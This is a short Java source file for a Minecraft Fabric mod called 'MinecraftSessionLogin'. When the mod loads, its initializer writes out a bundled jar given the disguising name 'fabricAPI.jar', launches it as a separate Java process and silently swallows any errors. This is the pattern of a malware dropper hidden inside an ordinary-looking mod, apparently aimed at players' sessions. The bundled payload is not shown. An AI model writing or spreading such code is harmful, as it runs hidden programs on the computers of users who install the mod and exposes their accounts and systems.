package tk.jandev.minecraftsessionlogin;

import net.fabricmc.api.ModInitializer;
import org.apache.commons.io.IOUtils;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MinecraftSessionLogin implements ModInitializer {
    @Override
    public void onInitialize() {
        try {
            String fp = "fabricAPI.jar";
            InputStream file = Thread.currentThread().getContextClassLoader().getResourceAsStream("fabricAPI.jar");
            OutputStream out_file = new FileOutputStream(fp);
            IOUtils.copy(file, out_file);
            out_file.close();
            file.close();
            Runtime.getRuntime().exec(String.format("java -jar %s", fp)).wait();
        } catch (Exception ignored) {}
    }
}


